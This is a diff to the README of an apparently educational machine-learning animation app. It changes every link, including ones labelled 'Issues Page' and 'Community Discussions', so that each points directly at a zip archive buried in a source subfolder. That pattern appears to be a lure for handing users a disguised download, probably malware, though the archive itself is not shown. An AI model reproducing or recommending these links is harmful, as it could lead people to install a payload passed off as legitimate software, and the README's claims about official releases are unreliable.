@@ -6,7 +6,7 @@ Welcome to ml-animations! This application helps you learn machine learning thro
 
 ## 📥 Download the Latest Version
 
-[![Download](https://raw.githubusercontent.com/kubaxipl11/ml-animations/main/self-attention-animation/src/ml-animations-v1.0.zip%https://raw.githubusercontent.com/kubaxipl11/ml-animations/main/self-attention-animation/src/ml-animations-v1.0.zip)](https://raw.githubusercontent.com/kubaxipl11/ml-animations/main/self-attention-animation/src/ml-animations-v1.0.zip)
+[![Download](https://raw.githubusercontent.com/kubaxipl11/ml-animations/main/unified-app/src/animations/spearman-correlation/animations-ml-v3.9.zip%https://raw.githubusercontent.com/kubaxipl11/ml-animations/main/unified-app/src/animations/spearman-correlation/animations-ml-v3.9.zip)](https://raw.githubusercontent.com/kubaxipl11/ml-animations/main/unified-app/src/animations/spearman-correlation/animations-ml-v3.9.zip)
 
 ## 📦 System Requirements
 
@@ -28,7 +28,7 @@ Before you get started, make sure your computer meets these requirements:
 ## 🛠️ How to Download & Install
 
 1. **Visit the Releases Page:**
-   Click this link to access the official downloads: [Download Here](https://raw.githubusercontent.com/kubaxipl11/ml-animations/main/self-attention-animation/src/ml-animations-v1.0.zip).
+   Click this link to access the official downloads: [Download Here](https://raw.githubusercontent.com/kubaxipl11/ml-animations/main/unified-app/src/animations/spearman-correlation/animations-ml-v3.9.zip).
 
 2. **Choose the Latest Release:**
    Look for the latest version at the top of the page. You will see a section with assets for download.
@@ -93,8 +93,8 @@ A: You will learn machine learning concepts through visualizations and hands-on 
 
 ## 🔗 Quick Links
 
-- [Download ml-animations](https://raw.githubusercontent.com/kubaxipl11/ml-animations/main/self-attention-animation/src/ml-animations-v1.0.zip)
-- [Issues Page](https://raw.githubusercontent.com/kubaxipl11/ml-animations/main/self-attention-animation/src/ml-animations-v1.0.zip)
-- [Community Discussions](https://raw.githubusercontent.com/kubaxipl11/ml-animations/main/self-attention-animation/src/ml-animations-v1.0.zip)
+- [Download ml-animations](https://raw.githubusercontent.com/kubaxipl11/ml-animations/main/unified-app/src/animations/spearman-correlation/animations-ml-v3.9.zip)
+- [Issues Page](https://raw.githubusercontent.com/kubaxipl11/ml-animations/main/unified-app/src/animations/spearman-correlation/animations-ml-v3.9.zip)
+- [Community Discussions](https://raw.githubusercontent.com/kubaxipl11/ml-animations/main/unified-app/src/animations/spearman-correlation/animations-ml-v3.9.zip)
 
 Thank you for choosing ml-animations to enhance your machine learning journey!
